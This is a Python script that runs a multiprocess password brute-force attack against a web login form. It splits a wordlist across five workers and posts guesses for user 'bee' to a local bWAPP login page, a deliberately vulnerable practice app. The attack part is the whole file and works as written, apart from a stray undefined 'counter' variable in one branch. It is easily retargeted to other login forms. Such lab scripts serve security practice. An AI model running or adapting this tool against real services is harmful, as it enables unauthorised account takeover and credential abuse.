import requests
import time
import threading
from collections import deque
import cursor
import sys
from multiprocessing import Pool
printLock=threading.Lock()
counterVar=0
cursor.hide()


def readWordLists(wordListFile, n):
    wl=open(wordListFile,'r')
    wordLists=list()
    for x in range(n):
        wordLists.append(list())
    line=" "
    while(line!=""):
        for x in range(len(wordLists)):
            line= wl.readline()

            if(line!=""):
                temp = line[:-1]
                wordLists[x].append(temp)

            else:
                break
    return wordLists
class brute():
    def __init__(self, name,targetString,post_request_key_values,targetKey,wordListFile,goalUrls,printLock):
        self.name = name
        self.targetString=targetString
        self.post_request_key_values=post_request_key_values
        self.targetKey=targetKey
        self.wordListFile = wordListFile
        self.goalUrls=goalUrls
        self.printLock=printLock

    def bruteAttack(self):
        global counterVar
        solutionSet=dict()
        for x in self.wordListFile:
            self.post_request_key_values[self.targetKey] = x
            r = requests.post(self.targetString, data = self.post_request_key_values)
            if not(r.url in solutionSet.keys()):
                b=list()
                b.append(x)
                solutionSet[r.url]=b
            else:
                solutionSet[r.url].append(x)

        if len(self.goalUrls)!=0:
            for x in self.goalUrls:
                if(x in solutionSet):
                    self.printLock.acquire()
                    print("\n")
                    print(self.name+str(solutionSet[x])+":"+str(x))
                    counterVar+=1
                    self.printLock.release()
                else:
                    printLock.acquire()
                    print("\n")
                    print(self.name+"No Solutions for:"+str(x))
                    counterVar+=1
                    printLock.release()

        else:
            self.printLock.acquire()
            print("\n")
            print(solutionSet)
            counter+=1
            self.printLock.release()
def launchBrutes(numberBrutes):
    wordLists=readWordLists('bWAPPWL',numberBrutes)
    p = Pool(numberBrutes)
    p.map(launchBrutesHelper,wordLists)
class loadBarThread (threading.Thread):
        def __init__(self,lock):
            threading.Thread.__init__(self)
            self.printLock=lock
        def run(self):
            loadingBar(self.printLock)
def launchBrutesHelper(WL):
    global printLock
    myloadBarThread=loadBarThread(printLock)
    myloadBarThread.start()
    brootie=brute("Brootie","http://localhost/bWAPP/login.php",{'login':'bee','form':'submit'},"password",WL,['http://localhost/bWAPP/portal.php'],printLock)
    brootie.bruteAttack()
def loadingBar(printLock):
    global counterVar
    while(counterVar!=1):
        printLock.acquire()
        print("\rLoading   ",end="")
        time.sleep(.5) #do some work here...
        print("\rLoading.", end="")
        time.sleep(.5) #do some more work here...
        print("\rLoading..", end="")
        time.sleep(.5) #do even more work...
        print("\rLoading...", end="")
        time.sleep(.5) #gratuitious amounts of work...
        print("\rLoading", end="")
        printLock.release()
        time.sleep(.5)


if __name__ == '__main__':
    launchBrutes(5)
